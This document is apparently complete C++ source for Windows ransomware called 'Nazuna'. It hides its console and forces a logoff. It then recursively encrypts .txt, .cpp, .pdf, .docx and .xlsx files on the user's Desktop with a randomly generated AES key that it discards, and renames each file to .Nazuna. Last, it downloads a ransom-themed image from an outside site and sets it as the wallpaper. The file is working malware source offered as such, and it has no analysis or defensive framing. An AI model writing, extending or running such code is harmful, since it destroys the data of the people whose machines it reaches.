#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <string.h>
#include <fstream>
#include <vector>
#include <filesystem>
#include <iostream>

using namespace std;

#pragma comment(lib, "urlmon.lib")

#define BUF_LEN 1024
#define KEY_TAM 16
#define USER_TAM 256

struct Nazuna {
    static constexpr BYTE KEY[KEY_TAM] = { 0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 };
    static constexpr BYTE IV[KEY_TAM] = { 0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 };

    HCRYPTPROV hProv;
    HCRYPTKEY hkey;
};

bool cifrar_archivos(const string& filePath);
void recorrer_dir(const string& ruta_recorrer);

bool cifrar_archivos(const string& filePath) {
    BYTE buf[BUF_LEN];
    Nazuna nazuna;

    ifstream archivo_original(filePath, ios::binary);
    if (!archivo_original.is_open()) {
        return false;
    }

    archivo_original.read(reinterpret_cast<char*>(buf), BUF_LEN);
    DWORD bytes_leer = static_cast<DWORD>(archivo_original.gcount());
    archivo_original.close();

    DWORD mode = CRYPT_MODE_CBC;

    if (!CryptAcquireContext(&nazuna.hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, 0)) {
        if (!CryptAcquireContext(&nazuna.hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_NEWKEYSET)) {
            return false;
        }
    }

    CryptGenKey(nazuna.hProv, CALG_AES_128, CRYPT_EXPORTABLE, &nazuna.hkey);
    CryptSetKeyParam(nazuna.hkey, KP_IV, Nazuna::IV, 0);
    CryptSetKeyParam(nazuna.hkey, KP_MODE, reinterpret_cast<const BYTE*>(&mode), 0);
    CryptEncrypt(nazuna.hkey, 0, true, 0, buf, &bytes_leer, BUF_LEN);

    ofstream archivo_cifrado(filePath, ios::binary);

    if (!archivo_cifrado.is_open()) {
        CryptDestroyKey(nazuna.hkey);
        CryptReleaseContext(nazuna.hProv, 0);
        return false;
    }

    archivo_cifrado.write(reinterpret_cast<char*>(buf), bytes_leer);
    archivo_cifrado.close();

    CryptDestroyKey(nazuna.hkey);
    CryptReleaseContext(nazuna.hProv, 0);

    return true;
}


void recorrer_dir(const string& ruta_recorrer) {
    vector<string> subdirectorios;

    string ruta_encriptar = ruta_recorrer + "\\*";
    WIN32_FIND_DATA ruta_data;
    HANDLE hFind = FindFirstFile(ruta_encriptar.c_str(), &ruta_data);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (ruta_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (strcmp(ruta_data.cFileName, ".") != 0 && strcmp(ruta_data.cFileName, "..") != 0) {
                    string subruta_recorrer = ruta_recorrer + "\\" + ruta_data.cFileName;
                    subdirectorios.push_back(subruta_recorrer);
                }
            } else {
                const string filePath = ruta_recorrer + "\\" + ruta_data.cFileName;
                const string extension = filesystem::path(filePath).extension().string();

                if (extension == ".txt" || extension == ".cpp" || extension == ".pdf" || extension == ".docx" || extension == ".xlsx") {
                    if (cifrar_archivos(filePath)) {
                        const string newFileName = filesystem::path(filePath).replace_extension(".Nazuna").string();
                        filesystem::rename(filePath, newFileName);
                    }
                }
            }
        } while (FindNextFile(hFind, &ruta_data));

        FindClose(hFind);
    }

    for (const auto& subdir : subdirectorios) {
        recorrer_dir(subdir);
    }
}

void cambiar_fondo() {
    char username[USER_TAM];
    DWORD username_tam = USER_TAM;
    
    GetUserNameA(username, &username_tam);
    const char* url = "https://w.wallhaven.cc/full/wq/wallhaven-wqpywp.jpg";

    string destino_guardar = "C:\\Users\\";
    destino_guardar += username;
    destino_guardar += "\\Downloads\\NazunaRansom.jpg";
    
    LPCSTR lpcstr_destino = destino_guardar.c_str();
    
    URLDownloadToFile(NULL, url, lpcstr_destino, 0, NULL);
    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)lpcstr_destino, SPIF_UPDATEINIFILE);
}

int main() {
    HWND ventana_cmd = GetConsoleWindow();
	ShowWindow(ventana_cmd, SW_HIDE);

    ExitWindowsEx(EWX_LOGOFF, 0);

    string ruta = filesystem::path(string(getenv("USERPROFILE")) + "\\Desktop").string();
    recorrer_dir(ruta);
    cambiar_fondo();

    return 0;
}